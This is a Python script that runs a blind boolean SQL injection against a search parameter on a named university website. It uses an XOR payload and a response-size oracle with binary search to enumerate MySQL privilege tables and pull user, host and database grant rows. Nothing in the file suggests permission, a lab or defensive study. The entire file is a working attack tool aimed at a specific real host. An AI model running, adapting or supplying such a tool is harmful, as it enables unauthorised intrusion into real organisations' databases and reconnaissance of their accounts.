#!/usr/bin/env python3
"""Extract mysql.db grant rows (user@host -> db) via content oracle. Writes /tmp/sqli_mysqldb_uef.json"""
import time, json, threading, urllib.parse, http.client, ssl
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000
LOG = "/tmp/sqli_enum_uef.log"
OUT = "/tmp/sqli_mysqldb_uef.json"
lock = threading.Lock()
stats = {"req": 0}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()


def log(m):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), m)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def conn():
    c = getattr(_local, "c", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.c = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for _ in range(3):
        try:
            c = conn()
            c.request("GET", url, headers={"User-Agent": UA})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            _local.c = None
        except Exception:
            _local.c = None
    return None


def ask(expr):
    s = http_size(expr)
    return False if s is None else s >= THRESH


def get_len(expr, maxlen=64):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, workers=3):
    n = get_len(expr)
    if n <= 0:
        log("%s: EMPTY" % label)
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_char, expr, p + 1): p for p in range(n)}
        for f, p in futs.items():
            chars[p] = f.result()
    s = "".join(chars)
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r (verify=%s, len=%d, req=%d)" % (label, s, ok, n, stats["req"]))
    return s if ok else s + " [VERIFY_FAILED]"


def num(expr, maxval=256):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def save(d):
    with open(OUT, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def main():
    t0 = time.time()
    log("=== MYSQLDB START ===")
    d = {}
    d["mysql_db_readable"] = ask("(SELECT COUNT(*) FROM mysql.db)>=0")
    d["mysql_user_readable"] = ask("(SELECT COUNT(*) FROM mysql.user)>=0")
    d["tables_priv_readable"] = ask("(SELECT COUNT(*) FROM mysql.tables_priv)>=0")
    log("readable: mysql.db=%s mysql.user=%s tables_priv=%s" % (d["mysql_db_readable"], d["mysql_user_readable"], d["tables_priv_readable"]))
    save(d)
    if d["mysql_db_readable"]:
        n = num("SELECT COUNT(*) FROM mysql.db")
        rows = []
        for i in range(min(n, 30)):
            u = extract("SELECT user FROM mysql.db ORDER BY host,db,user LIMIT %d,1" % i, "mdb.u[%d]" % i)
            h = extract("SELECT host FROM mysql.db ORDER BY host,db,user LIMIT %d,1" % i, "mdb.h[%d]" % i)
            db = extract("SELECT db FROM mysql.db ORDER BY host,db,user LIMIT %d,1" % i, "mdb.d[%d]" % i)
            rows.append({"user": u, "host": h, "db": db})
            d["rows"] = rows
            save(d)
    log("=== MYSQLDB DONE in %.0fs, req=%d ===" % (time.time() - t0, stats["req"]))


if __name__ == "__main__":
    main()
